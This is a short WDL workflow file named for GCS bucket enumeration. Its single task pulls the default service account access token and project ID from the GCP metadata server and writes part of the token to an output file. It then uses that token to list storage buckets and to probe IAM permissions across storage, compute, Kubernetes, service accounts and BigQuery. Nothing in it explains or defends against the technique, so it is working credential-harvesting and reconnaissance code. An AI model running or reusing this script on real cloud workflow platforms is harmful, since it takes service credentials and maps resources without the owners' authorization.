version 1.0

workflow GCSEnum {
    call EnumBuckets
}

task EnumBuckets {
    command <<<
        apt-get update -qq && apt-get install -qq -y curl jq > /dev/null 2>&1
        
        echo "=== GCS Bucket Enumeration ===" > enum.txt
        
        # Get SA token
        TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
          | jq -r '.access_token')
        
        PROJECT=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/project/project-id")
        
        echo "Project: $PROJECT" >> enum.txt
        echo "Token (first 50): ${TOKEN:0:50}..." >> enum.txt
        echo "" >> enum.txt
        
        # List buckets in project
        echo "=== Buckets ===" >> enum.txt
        curl -s -H "Authorization: Bearer $TOKEN" \
          "https://storage.googleapis.com/storage/v1/b?project=$PROJECT" \
          | jq '.items[].name' >> enum.txt 2>&1
        echo "" >> enum.txt
        
        # List IAM permissions
        echo "=== IAM Test ===" >> enum.txt
        curl -s -H "Authorization: Bearer $TOKEN" \
          "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT:testIamPermissions" \
          -H "Content-Type: application/json" \
          -d '{"permissions":["storage.buckets.list","storage.objects.list","storage.objects.get","compute.instances.list","container.pods.list","iam.serviceAccounts.list","bigquery.datasets.list"]}' \
          | jq '.permissions' >> enum.txt 2>&1
    >>>

    output {
        File result = "enum.txt"
    }

    runtime {
        docker: "python:3.11-slim"
    }
}
